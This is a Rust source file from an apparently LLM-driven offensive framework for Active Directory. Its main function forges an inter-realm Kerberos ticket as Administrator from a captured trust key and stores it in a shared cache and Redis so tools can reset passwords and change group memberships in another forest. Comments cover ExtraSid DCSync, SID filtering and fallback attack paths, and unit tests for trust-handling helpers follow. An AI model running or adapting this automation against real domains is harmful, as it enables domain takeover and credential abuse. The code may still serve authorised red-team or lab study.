/// `is_filtered_inter_forest_trust` is true. The ExtraSid DCSync path is
/// blocked by SID filtering, but a plain inter-realm TGT is still useful:
/// bloodyad with `-k` can perform Kerberos LDAP bind against the target DC
/// as Administrator, enabling password resets and group membership changes.
///
/// The ticket is written to `/tmp/ares-tickets/<src>__<tgt>__<user>.ccache`
/// (a shared path accessible to all workers on the same host) and persisted
/// to Redis via `publish_kerberos_ticket` so the credential resolver can
/// find it when bloodyad or other LDAP-bind tools target the foreign forest.
///
/// SID resolution is opportunistic: if the source SID isn't in state yet, we
/// pass an empty string and ticketer will still produce a ticket (though some
/// KDCs reject it). This is best-effort — the fallback paths (ACL/MSSQL) are
/// the primary attack vectors; this ticket is just a bonus.
async fn dispatch_create_inter_realm_ticket(
    dispatcher: &Dispatcher,
    source_domain: &str,
    target_domain: &str,
    trust_key: &str,
    aes_key: Option<&str>,
    source_domain_sid: Option<&str>,
) {
    use ares_llm::ToolCall;

    let ticket_username = "Administrator";

    // Build tool args. source_sid is required by the tool — use a fallback
    // empty string and let ticketer attempt the forge; worst case the KDC
    // rejects it and the ticket write fails silently.
    let source_sid = source_domain_sid.unwrap_or("");
    if source_sid.is_empty() {
        tracing::info!(
            source_domain,
            target_domain,
            "dispatch_create_inter_realm_ticket: source SID unknown, attempting forge with empty SID"
        );
    }

    let mut tool_args = serde_json::json!({
        "trust_key":     trust_key,
        "source_sid":    source_sid,
        "source_domain": source_domain,
        "target_domain": target_domain,
        "username":      ticket_username,
    });
    if let Some(aes) = aes_key {
        tool_args["aes_key"] = serde_json::json!(aes);
    }

    // Look up the target DC so the tool can chain ldap/<dc> + cifs/<dc>
    // service-ticket fetches into the same ccache. MIT GSSAPI clients can't
    // walk a referral starting from `krbtgt/<TARGET>@<SOURCE>`; they require
    // the service ticket to already be cached. Without this, the forged
    // inter-realm TGT is unusable for `ldapsearch -Y GSSAPI`.
    {
        let s = dispatcher.state.read().await;
        let target_lower = target_domain.to_lowercase();
        if let Some(dc_ip) = s.resolve_dc_ip(target_domain) {
            let dc_fqdn = s.hosts.iter().find_map(|h| {
                if h.ip != dc_ip || h.hostname.is_empty() {
                    return None;
                }
                let hn = h.hostname.to_lowercase();
                if hn.ends_with(&format!(".{target_lower}")) || hn == target_lower {
                    Some(hn)
                } else {
                    Some(format!("{hn}.{target_lower}"))
                }
            });
            if let Some(fqdn) = dc_fqdn {
                tool_args["target_dc_ip"] = serde_json::json!(dc_ip);
                tool_args["target_dc_fqdn"] = serde_json::json!(fqdn);
            }
        }
    }

    let call = ToolCall {
        id: format!("create_inter_realm_{}", uuid::Uuid::new_v4().simple()),
        name: "create_inter_realm_ticket".to_string(),
        arguments: tool_args,
    };
    let task_id = format!(
        "inter_realm_ticket_{}",
        &uuid::Uuid::new_v4().simple().to_string()[..12]
    );

    tracing::info!(
        source_domain,
        target_domain,
        task_id = %task_id,
        args = %call.arguments,
        "Dispatching create_inter_realm_ticket for SID-filtered trust (Kerberos LDAP path)"
    );

    match dispatcher
        .llm_runner
        .tool_dispatcher()
        .dispatch_tool("privesc", &task_id, &call)
        .await
    {
        Ok(result) => {
            if result.error.is_some() {
                tracing::warn!(
                    source_domain,
                    target_domain,
                    error = ?result.error,
                    "create_inter_realm_ticket returned error"
                );
                return;
            }
            // Parse the ticket path from the tool output (ARES_TICKET_PATH=<path>).
            let ticket_path = result
                .output
                .lines()
                .find_map(|line| line.strip_prefix("ARES_TICKET_PATH="))
                .map(str::trim)
                .filter(|p| !p.is_empty())
                .map(str::to_string);

            let Some(ticket_path) = ticket_path else {
                tracing::warn!(
                    source_domain,
                    target_domain,
                    "create_inter_realm_ticket succeeded but no ARES_TICKET_PATH in output"
                );
                return;
            };

            tracing::info!(
                source_domain,
                target_domain,
                ticket_path = %ticket_path,
                output_tail = %result.output.lines().rev().take(20).collect::<Vec<_>>().into_iter().rev().collect::<Vec<_>>().join(" | "),
                "Inter-realm ticket forged — persisting for Kerberos LDAP tools"
            );

            let ticket = ares_core::models::KerberosTicket {
                source_domain: source_domain.to_string(),
                target_domain: target_domain.to_string(),
                username: ticket_username.to_string(),
                ticket_path,
                forged_at: Some(chrono::Utc::now()),
            };
            let _ = dispatcher
                .state
                .publish_kerberos_ticket(&dispatcher.queue, ticket)
                .await;
        }
        Err(e) => {
            tracing::warn!(
                source_domain,
                target_domain,
                err = %e,
                "create_inter_realm_ticket dispatch error"
            );
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn child_to_parent_vuln_id_basic() {
        assert_eq!(
            child_to_parent_vuln_id("child.contoso.local", "contoso.local"),
            "child_to_parent_child_contoso_local_contoso_local"
        );
    }

    #[test]
    fn child_to_parent_vuln_id_case_insensitive() {
        assert_eq!(
            child_to_parent_vuln_id("CHILD.Contoso.Local", "Contoso.Local"),
            "child_to_parent_child_contoso_local_contoso_local"
        );
    }

    #[test]
    fn child_to_parent_vuln_id_replaces_dots() {
        let id = child_to_parent_vuln_id("a.b.c", "d.e");
        assert!(!id.contains('.'));
        assert_eq!(id, "child_to_parent_a_b_c_d_e");
    }

    #[test]
    fn child_to_parent_vuln_id_empty_strings() {
        assert_eq!(child_to_parent_vuln_id("", ""), "child_to_parent__");
    }

    #[test]
    fn forest_trust_vuln_id_basic() {
        assert_eq!(
            forest_trust_vuln_id("contoso.local", "fabrikam.local"),
            "forest_trust_contoso.local_fabrikam.local"
        );
    }

    #[test]
    fn forest_trust_vuln_id_case_insensitive() {
        assert_eq!(
            forest_trust_vuln_id("CONTOSO.LOCAL", "FABRIKAM.LOCAL"),
            "forest_trust_contoso.local_fabrikam.local"
        );
    }

    #[test]
    fn forest_trust_vuln_id_empty_strings() {
        assert_eq!(forest_trust_vuln_id("", ""), "forest_trust__");
    }

    #[test]
    fn trust_account_name_basic() {
        assert_eq!(trust_account_name("FABRIKAM"), "FABRIKAM$");
    }

    #[test]
    fn trust_account_name_lowered_input() {
        assert_eq!(trust_account_name("fabrikam"), "FABRIKAM$");
    }

    #[test]
    fn trust_account_name_mixed_case() {
        assert_eq!(trust_account_name("Contoso"), "CONTOSO$");
    }

    #[test]
    fn trust_account_name_empty() {
        assert_eq!(trust_account_name(""), "$");
    }

    #[test]
    fn is_domain_related_exact_match() {
        assert!(is_domain_related("contoso.local", "contoso.local"));
    }

    #[test]
    fn is_domain_related_case_insensitive() {
        assert!(is_domain_related("CONTOSO.LOCAL", "contoso.local"));
    }

    #[test]
    fn is_domain_related_child_of_target() {
        assert!(is_domain_related("child.contoso.local", "contoso.local"));
    }

    #[test]
    fn is_domain_related_parent_of_target() {
        assert!(is_domain_related("contoso.local", "child.contoso.local"));
    }

    #[test]
    fn is_domain_related_unrelated_domains() {
        assert!(!is_domain_related("fabrikam.local", "contoso.local"));
    }

    #[test]
    fn is_domain_related_partial_suffix_no_match() {
        // "oso.local" ends with "contoso.local" substring but is not a valid child
        assert!(!is_domain_related("oso.local", "contoso.local"));
    }

    #[test]
    fn is_domain_related_empty_strings() {
        assert!(is_domain_related("", ""));
    }

    #[test]
    fn is_domain_related_one_empty() {
        assert!(!is_domain_related("contoso.local", ""));
    }

    #[test]
    fn trust_enum_dedup_key_password() {
        assert_eq!(
            trust_enum_dedup_key("Contoso.Local", false),
            "trust_enum:contoso.local"
        );
    }

    #[test]
    fn trust_enum_dedup_key_hash_retry() {
        assert_eq!(
            trust_enum_dedup_key("Contoso.Local", true),
            "trust_enum_hash:contoso.local"
        );
    }

    #[test]
    fn trust_enum_dedup_key_case_insensitive() {
        assert_eq!(
            trust_enum_dedup_key("CONTOSO.LOCAL", false),
            trust_enum_dedup_key("contoso.local", false)
        );
    }

    #[test]
    fn trust_enum_dedup_key_empty_domain() {
        assert_eq!(trust_enum_dedup_key("", false), "trust_enum:");
        assert_eq!(trust_enum_dedup_key("", true), "trust_enum_hash:");
    }

    // is_filtered_inter_forest_trust

    fn state_with_trust(domain: &str, trust: ares_core::models::TrustInfo) -> StateInner {
        let mut s = StateInner::new("op-test".into());
        s.trusted_domains.insert(domain.to_lowercase(), trust);
        s
    }

    #[test]
    fn filtered_inter_forest_intra_forest_returns_false() {
        let s = StateInner::new("op-test".into());
        // child↔parent — not inter-forest, never filtered.
        assert!(!is_filtered_inter_forest_trust(
            &s,
            "child.contoso.local",
            "contoso.local"
        ));
    }

    #[test]
    fn filtered_inter_forest_explicit_filtering_on() {
        let trust = ares_core::models::TrustInfo {
            domain: "fabrikam.local".into(),
            flat_name: "FABRIKAM".into(),
            direction: "bidirectional".into(),
            trust_type: "forest".into(),
            sid_filtering: true,
        };
        let s = state_with_trust("fabrikam.local", trust);
        assert!(is_filtered_inter_forest_trust(
            &s,
            "contoso.local",
            "fabrikam.local"
        ));
    }

    #[test]
    fn filtered_inter_forest_explicit_filtering_off() {
        let trust = ares_core::models::TrustInfo {
            domain: "fabrikam.local".into(),
            flat_name: "FABRIKAM".into(),
            direction: "bidirectional".into(),
            trust_type: "forest".into(),
            sid_filtering: false,
        };
        let s = state_with_trust("fabrikam.local", trust);
        assert!(!is_filtered_inter_forest_trust(
            &s,
            "contoso.local",
            "fabrikam.local"
        ));
    }

    #[test]
    fn filtered_inter_forest_no_metadata_tries_forge() {
        let s = StateInner::new("op-test".into());
        // No TrustInfo for the target. Without explicit filtering metadata we
        // try the forge — the cost of an unnecessary attempt (~30s) is cheaper
        // than silently dropping a valid attack on a misconfigured trust.
        assert!(!is_filtered_inter_forest_trust(
            &s,
            "contoso.local",
            "fabrikam.local"
        ));
    }

    #[test]
    fn filtered_inter_forest_ignores_unrelated_source_metadata() {
        // Repro of op-20260429-111016 bug: north discovered its parent trust
        // and stored TrustInfo{ domain="sevenkingdoms.local", parent_child,
        // sid_filtering=false }. Querying the unrelated cross-forest path
        // sevenkingdoms.local → essos.local must NOT be answered with that
        // parent_child entry (which would wrongly classify the cross-forest
        // path as intra-forest). With no metadata for the actual target we
        // now try the forge rather than silently suppressing it.
        let parent_trust = ares_core::models::TrustInfo {
            domain: "contoso.local".into(),
            flat_name: "CONTOSO".into(),
            direction: "bidirectional".into(),
            trust_type: "parent_child".into(),
            sid_filtering: false,
        };
        let s = state_with_trust("contoso.local", parent_trust);
        // Target fabrikam.local has no metadata — try the forge.
        assert!(!is_filtered_inter_forest_trust(
            &s,
            "contoso.local",
            "fabrikam.local"
        ));
    }

    #[test]
    fn filtered_inter_forest_target_metadata_authoritative() {
        // When the target's TrustInfo says cross-forest with SID filtering,
        // suppress the forge regardless of any source-side parent_child entry.
        let target_trust = ares_core::models::TrustInfo {
            domain: "fabrikam.local".into(),
            flat_name: "FABRIKAM".into(),
            direction: "bidirectional".into(),
            trust_type: "forest".into(),
            sid_filtering: true,
        };
        let s = state_with_trust("fabrikam.local", target_trust);
        assert!(is_filtered_inter_forest_trust(
            &s,
            "contoso.local",
            "fabrikam.local"
        ));
    }
}
